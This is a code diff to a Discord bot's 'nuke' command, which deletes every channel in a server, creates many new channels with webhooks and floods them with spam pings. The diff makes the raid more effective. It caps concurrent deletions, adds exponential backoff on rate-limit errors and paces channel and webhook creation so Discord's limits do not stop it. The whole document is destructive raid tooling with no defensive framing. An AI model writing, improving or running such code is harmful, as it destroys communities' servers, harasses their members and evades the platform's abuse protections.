@@ -23,14 +23,22 @@ async def on_ready():
     print(f"✅ {bot.user} is online and ready.")
 
 async def spam_webhook(webhook):
-    for ping_count in range(pings_per_channel):
+    backoff = 1
+    for i in range(pings_per_channel):
         try:
             await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
-            if (ping_count + 1) % 10 == 0:
-                print(f"Sent {ping_count + 1} pings in webhook {webhook.name}")
-            await asyncio.sleep(0.1)
+            if (i + 1) % 10 == 0:
+                print(f"Sent {i + 1} pings in webhook {webhook.name}")
+            await asyncio.sleep(0.1)  # Small delay between messages to reduce rate limit hits
+            backoff = 1  # reset backoff after success
+        except discord.errors.HTTPException as e:
+            # Rate limited or other HTTP error
+            print(f"Rate limit hit or error sending webhook message: {e}. Backing off {backoff}s.")
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 10)  # exponential backoff capped at 10 seconds
         except Exception as e:
-            print(f"❌ Webhook send failed: {e}")
+            print(f"Unexpected error sending webhook message: {e}")
+            break
 
 @bot.command()
 async def nuke(ctx):
@@ -38,42 +46,53 @@ async def nuke(ctx):
     guild = ctx.guild
     print("⚠️ Starting NUKE sequence...")
 
-    # --- DELETE ALL CHANNELS FIRST ---
+    # Delete all channels concurrently but with a small semaphore to avoid bursting
     channels = list(guild.channels)
     print(f"Deleting {len(channels)} channels...")
-    delete_tasks = []
-    for channel in channels:
-        delete_tasks.append(channel.delete())
-    # Await all deletions concurrently for speed
-    await asyncio.gather(*delete_tasks)
-    print("✅ All channels deleted.")
 
-    # Optional delay to ensure Discord processed the deletions
-    await asyncio.sleep(2)
+    sem = asyncio.Semaphore(5)  # limit concurrent deletes to 5
 
-    # --- CREATE CHANNELS & SPAWN SPAM TASKS ---
-    spam_tasks = []
-    print(f"Creating {channels_to_create} channels and starting spam immediately...")
+    async def safe_delete(channel):
+        async with sem:
+            try:
+                await channel.delete()
+                print(f"Deleted channel: {channel.name}")
+            except Exception as e:
+                print(f"Failed to delete channel {channel.name}: {e}")
 
+    await asyncio.gather(*(safe_delete(c) for c in channels))
+
+    await asyncio.sleep(2)  # Give Discord some breathing room
+
+    # Create channels one by one with small delay to avoid rate limits
+    print(f"Creating {channels_to_create} channels...")
+
+    created_channels = []
     for i in range(channels_to_create):
         try:
             channel = await guild.create_text_channel(f"{channel_name}-{i}")
+            created_channels.append(channel)
             print(f"Created channel: {channel.name}")
-
-            webhook = await channel.create_webhook(name=webhook_name)
-            print(f"Created webhook in {channel.name}")
-
-            task = asyncio.create_task(spam_webhook(webhook))
-            spam_tasks.append(task)
-
-            await asyncio.sleep(0.1)  # Slight delay before creating next channel
+            await asyncio.sleep(0.4)  # slower channel creation to avoid rate limits
         except Exception as e:
-            print(f"❌ Failed to create channel or webhook for channel {i}: {e}")
+            print(f"Failed to create channel {i}: {e}")
 
-    print("✅ All channels created and spamming started.")
+    # Create webhooks for all channels
+    webhooks = []
+    for channel in created_channels:
+        try:
+            webhook = await channel.create_webhook(name=webhook_name)
+            webhooks.append(webhook)
+            print(f"Created webhook in {channel.name}")
+            await asyncio.sleep(0.2)
+        except Exception as e:
+            print(f"Failed to create webhook in {channel.name}: {e}")
 
-    # Optionally wait for all spam tasks to finish (can remove if you want them to keep running)
+    # Start all webhook spam tasks concurrently
+    print(f"Starting spam in all channels...")
+    spam_tasks = [asyncio.create_task(spam_webhook(wh)) for wh in webhooks]
     await asyncio.gather(*spam_tasks)
+
     print("✅ NUKE complete.")
 
 if __name__ == "__main__":
